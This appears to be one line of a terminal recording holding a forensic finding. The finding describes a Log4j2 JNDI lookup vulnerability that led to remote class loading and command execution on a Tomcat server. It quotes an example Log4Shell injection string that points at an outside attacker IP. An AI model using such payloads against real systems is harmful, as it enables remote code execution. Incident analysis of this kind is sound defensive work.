[166.310325, "o", "The application configuration at `/opt/app/log4j2.xml` had message-lookup JNDI features enabled (`/disk/opt/app/log4j2.xml:3`). When incoming user-controlled strings containing JNDI lookup expressions (e.g., `${jndi:ldap://198.51.100.136/...}`) were processed by Log4j2, the application executed an unauthenticated outbound JNDI request to the threat actor host, resulting in arbitrary Java class loading and system command execution (`/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`).\r\n\u001b[?2004l\r\u001b[?2004h"]
